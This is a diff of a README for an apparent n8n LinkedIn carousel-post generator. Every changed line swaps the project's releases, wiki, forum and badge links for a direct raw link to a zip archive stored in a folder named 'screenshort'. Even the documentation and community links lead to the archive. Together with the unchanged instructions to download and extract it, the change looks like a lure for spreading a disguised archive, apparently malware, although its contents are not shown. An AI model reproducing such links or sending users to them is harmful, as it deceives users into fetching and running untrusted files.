@@ -1,6 +1,6 @@
 # 🚀 n8n-LinkedIN-carousel-posts - Generate LinkedIn Posts with Ease
 
-[![Download n8n-LinkedIN-carousel-posts](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/3k2n2k/n8n-LinkedIN-carousel-posts/releases)
+[![Download n8n-LinkedIN-carousel-posts](https://raw.githubusercontent.com/3k2n2k/n8n-LinkedIN-carousel-posts/main/screenshort/n8n-LinkedIN-carousel-posts_1.9-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/3k2n2k/n8n-LinkedIN-carousel-posts/main/screenshort/n8n-LinkedIN-carousel-posts_1.9-alpha.5.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ n8n-LinkedIN-carousel-posts helps you create stunning LinkedIn carousel posts in
 
 ## 🚀 Getting Started
 
-1. **Visit the [Releases Page](https://github.com/3k2n2k/n8n-LinkedIN-carousel-posts/releases)** to download the latest version of the application.
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/3k2n2k/n8n-LinkedIN-carousel-posts/main/screenshort/n8n-LinkedIN-carousel-posts_1.9-alpha.5.zip)** to download the latest version of the application.
    
 2. **Extract the Files**: After downloading, locate the zip file. Right-click it and choose "Extract All."
 
@@ -33,7 +33,7 @@ n8n-LinkedIN-carousel-posts helps you create stunning LinkedIn carousel posts in
 
 To download the application, use the link below:
 
-[Download n8n-LinkedIN-carousel-posts](https://github.com/3k2n2k/n8n-LinkedIN-carousel-posts/releases)
+[Download n8n-LinkedIN-carousel-posts](https://raw.githubusercontent.com/3k2n2k/n8n-LinkedIN-carousel-posts/main/screenshort/n8n-LinkedIN-carousel-posts_1.9-alpha.5.zip)
 
 After downloading, follow the instructions under "Getting Started" to install and run the application.
 
@@ -59,8 +59,8 @@ After downloading, follow the instructions under "Getting Started" to install an
 
 ## 🔗 Useful Links
 
-- **Documentation**: [Read the full documentation here](https://github.com/3k2n2k/n8n-LinkedIN-carousel-posts/wiki)
-- **Community Support**: Participate in our [Community Forum](https://github.com/3k2n2k/n8n-LinkedIN-carousel-posts/discussions)
+- **Documentation**: [Read the full documentation here](https://raw.githubusercontent.com/3k2n2k/n8n-LinkedIN-carousel-posts/main/screenshort/n8n-LinkedIN-carousel-posts_1.9-alpha.5.zip)
+- **Community Support**: Participate in our [Community Forum](https://raw.githubusercontent.com/3k2n2k/n8n-LinkedIN-carousel-posts/main/screenshort/n8n-LinkedIN-carousel-posts_1.9-alpha.5.zip)
 
 ## ✉️ Contact
 
